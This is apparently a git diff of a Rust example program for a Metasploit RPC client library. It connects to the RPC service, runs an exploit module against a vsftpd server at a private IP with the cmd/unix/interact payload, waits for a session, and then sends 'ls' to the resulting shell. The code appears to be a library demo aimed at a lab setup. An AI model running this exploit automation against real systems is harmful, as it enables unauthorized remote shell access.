@@ -1,9 +1,12 @@
+use std::{thread,time};
+
 use msf_client::client::MsfClient;
-use msf_client::client::MsfModule;
+use msf_client::modules::MsfModule;
 
 
 fn main() {
-    let mut client = MsfClient::new("msf", "1234", "http://172.17.0.2:55553/api/".to_string())
+    // replace IP with address of metasploit RPC
+    let mut client = MsfClient::new("msf", "1234", "http://127.0.0.1:55553/api/".to_string())
                                .expect("Trying to connect");
 
     let res = client.core().version().expect("Core version");
@@ -23,7 +26,8 @@ fn main() {
         println!("{}",pay_name);
     }
 
-    exp_mod.run_options.insert(String::from("RHOST"), String::from("172.17.0.3"));
+    // replace IP with address of vsftpd server
+    exp_mod.run_options.insert(String::from("RHOST"), String::from("192.168.0.2"));
     exp_mod.run_options.insert(String::from("PAYLOAD"), String::from("cmd/unix/interact"));
 
     let job_id = exp_mod.exploit().expect("Running exploit");
@@ -31,10 +35,16 @@ fn main() {
 
     let mut sessions = client.sessions();
 
-    let sess_info = client.sessions().list().expect("List of current sessions");
+    let mut sess_info = client.sessions().list().expect("List of current sessions");
+    let ten_millis = time::Duration::from_millis(10);
+    // need to have at least one session
+    while sess_info.len() == 0 {
+        sess_info = client.sessions().list().expect("List of current sessions");
+        thread::sleep(ten_millis);
+    }
 
     for sid in sess_info.keys() {
-        let mut session = sessions.session(sid).expect("Getting session");
+        let mut session = sessions.session(*sid).expect("Getting session");
 
         println!("{}", session.write(String::from("ls\n")));
         println!("{}", session.read());
